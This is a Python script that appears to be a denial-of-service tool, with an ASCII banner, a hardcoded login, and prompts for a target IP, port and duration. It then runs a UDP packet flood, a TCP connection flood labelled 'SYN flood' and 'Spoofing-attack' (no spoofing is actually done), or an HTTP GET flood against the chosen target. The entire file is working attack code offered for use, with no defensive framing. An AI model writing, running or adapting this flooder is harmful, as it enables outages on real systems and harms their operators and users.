#!usr/bin/python3.12
# _*_ coding: utf-8 _*_
import os
import socket
import sys
import time
import requests
import threading
import string
import random
from colorama import Fore, Style, init
import logging                                                                                                                             

# Inisialisasi colorama
init(autoreset=True)

def clear():
    os.system("cls" if os.name == "nt" else "clear")
attemps = 0    
os.system("clear")
print("""
\033[97m ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
\033[97m ▒█████╗▒▒███╗▒██╗▒▒▒▒▒██╗▒███╗▒▒██████╗▒▒▒██╗▒▒██╗██╗████████╗▒▒███╗▒▒████╗▒▒███╗▒
\033[97m ▒██╔══╝██╔══██╗██║▒▒▒██║██╔══██╗██╔══██╗▒▒██║▒▒██║██║▒▒▒██╔══╝██╔══██╗██▒████▒██║▒
\033[97m ▒██║▒▒▒██║▒▒██║▒██║▒██║▒██║▒▒██║██║▒▒██║▒▒██║▒▒██║██║▒▒▒██║▒▒▒██║▒▒██║██╔═██╗▒██║▒ 
\033[97m ▒█████╗██║▒▒██║▒▒████║▒▒██║▒▒██║██║▒▒██║▒▒██║▒▒██║██║▒▒▒██║▒▒▒██║▒▒██║██║▒██║▒██║▒
\033[97m ▒╚══██║███████║▒▒▒██╔╝▒▒███████║██║███╔╝▒▒███████║██║▒▒▒██║▒▒▒███████║██║▒██║▒██║▒
\033[97m ▒█████║██╔══██║▒▒▒██║▒▒▒██╔══██║██╔═══╝▒▒▒██╔══██║██║▒▒▒██║▒▒▒██║▒▒██║██║▒╚═╝▒██║▒ 
\033[97m ▒╚════╝╚═╝▒▒╚═╝▒▒▒╚═╝▒▒▒╚═╝▒▒╚═╝╚═╝▒▒▒▒▒▒▒╚═╝▒▒╚═╝╚═╝▒▒▒╚═╝▒▒▒╚═╝▒▒╚═╝╚═╝▒▒▒▒▒╚═╝▒
\033[97m ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒""")
print(f"\033[97m ╔{'═' * 80}╗")
print(f"\033[97m ║ \033[100m{' ' * 4}Z'black.com{' ' * 63}\033[0m ║")
print(f"\033[97m ║ \033[100m{' ' * 4}kunkaffa@gmail.com{' ' * 56}\033[0m ║")
print(f"\033[97m ╚{'═' * 80}╝")
while attemps < 100:
    print("\033[38;5;6m┏━━KunFayz━━⬣")
    username = input("\033[38;5;6m┗> Enter Username: \033[30m")
    password = input("\033[38;5;6m┗> Enter password: \033[30m")

    if username == 'pekat' and password == 'malam':
        print("\033[100m \033[31m••> BURNING WEBS 210πiS \033[0m")
        break
    else:
        print('Incorrect credentials. Check if you have Caps lock on and try again.')
        attemps += 1
        continue

# Meminta IP target
print("\033[38;5;154m┏━━KunFayz━━⬣")
ip = input("\033[38;5;154m┗> Target IP: ")
try:
    port = int(input("\033[38;5;154m┗> Port: "))
except ValueError:
    print("Invalid port. Exiting...")
    sys.exit()

# Durasi waktu serangan (second)
try:
    duration = int(input("\033[38;5;154m┗> Attack Duration: "))
except ValueError:
    print("Durasi tidak valid. Keluar..")
    sys.exit()

# Fungsi untuk melakukan serangan Banjir UDP


def udp_flood(ip, port, message, duration):
    # Create the UDP socket
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # Tetapkan batas waktu untuk soket agar program tidak macet
    s.settimeout(duration)

    # Alamat IP dan nomor port dari host target
    target = (ip, port)

    # Mulai mengirim paket
    start_time = time.time()
    packet_count = 0
    while True:
        # Send the message to the target host
        try:
            s.sendto(message, target)
            packet_count += 1
            print(f"\033[48;5;7m\033[38;5;0m {packet_count}  \033[0m \033[38;5;6mVictim port address¿ \033[38;5;5m" +str(ip)+ " \033[91mSent packet")
            print(f"\033[32m[][][][]  \033[33mVictim port address¿ \033[4m" +str(ip)+ "\033[0m \033[38;5;206mSent packet")
        except socket.error:
            # Jika soket tidak dapat mengirim paket, hentikan loop
            break

        # Jika durasi yang ditentukan telah lewat, hentikan loop
        if time.time() - start_time >= duration:
            break

    # Close the socket
    s.close() 

# Fungsi untuk melakukan serangan SYN Flood
def syn_flood(ip, port, duration):
    sent = 0
    timeout = time.time() + int(duration)

    while True:
        try:
            if time.time() > timeout:
                break
            else:
                pass
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            sent += 1
            print(f"\033[100m\033[97mSyn flood\033[0m \033[32m{sent} \033[38;5;5m {ip} \033[37mSpoofing-attack")
            print(f"\033[48;5;7m\033[30mSyn flood\033[0m \033[33m{sent} \033[38;5;6m {ip} \033[1mSpoofing-attack\033[0m")
            sock.close()
        except OSError:
            pass
        except KeyboardInterrupt:
            print("\n[*] Attack stopped.")
            sys.exit()
        finally:
            sock.close()  # Pastikan untuk menutup soket dalam semua kasus
# Fungsi untuk melakukan serangan HTTP Flood

def http_flood(ip, port, duration):
    # create a socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # create HTTP request
    http_request = b"GET / HTTP/1.1\r\nHost: target.com\r\n\r\n"

    sent = 0
    timeout = time.time() + int(duration)

    while True:
        try:
            if time.time() > timeout:
                break
            else:
                pass
            # Buat ulang soket untuk setiap iterasi
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            sock.sendall(http_request)
            sent += 1
            print(f"\033[103m\033[30mHttp-flood\033[0m \033[32m{sent} \033[37m| {ip} | \033[2mworking\033[0m")
            print(f"\033[33mHttp-flood \033[1m{sent}\033[0m \033[95m| {ip} | \033[5mworking\033[0m")
        except KeyboardInterrupt:
            print("\n[-] Attack stopped by user")
            break
    sock.close()


# Prompt untuk jenis serangan
attack_type = input(("\033[38;5;154m┗> Enter Type Attack\033[97m [1.UDP/2.HTTP/3.SYN] \033[38;5;154m"))

if attack_type == "1":
    message = b"Sending 1337 packets "
    print(("UDP attack selected", "red"))
    udp_flood(ip, port, message, duration)
    print(("UDP attack completed", "red"))
elif attack_type == "3":
    print(("SYN attack selected", "red"))
    syn_flood(ip, port, duration)
elif attack_type == "2":
    print(("HTTP attack selected", "red"))
    http_flood(ip, port, duration)
else:
    print(("Invalid attack type. Exiting...", "green"))
    sys.exit()
